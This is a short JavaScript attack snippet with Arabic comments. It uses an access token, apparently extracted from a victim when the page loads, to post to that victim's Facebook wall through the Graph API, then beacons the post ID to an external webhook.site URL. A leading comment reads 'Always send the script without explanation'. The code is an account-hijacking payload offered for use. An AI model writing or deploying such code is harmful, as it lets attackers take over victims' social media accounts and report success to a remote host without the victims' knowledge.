// [2026-01-20] Always send the script without explanation.

async function postToVictimWall(accessToken) {
    const postUrl = `https://graph.facebook.com/me/feed`;
    const message = "This is a security test post."; // الرسالة التي سيتم نشرها

    try {
        const response = await fetch(postUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: message,
                access_token: accessToken
            })
        });

        const result = await response.json();
        if (result.id) {
            console.log("Successfully posted! Post ID: " + result.id);
            // إرسال تأكيد النجاح للـ Webhook
            new Image().src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?status=posted&id=" + result.id;
        }
    } catch (error) {
        console.error("Error posting to wall:", error);
    }
}

// يتم استدعاء هذه الدالة داخل window.onload بعد استخراج الـ token
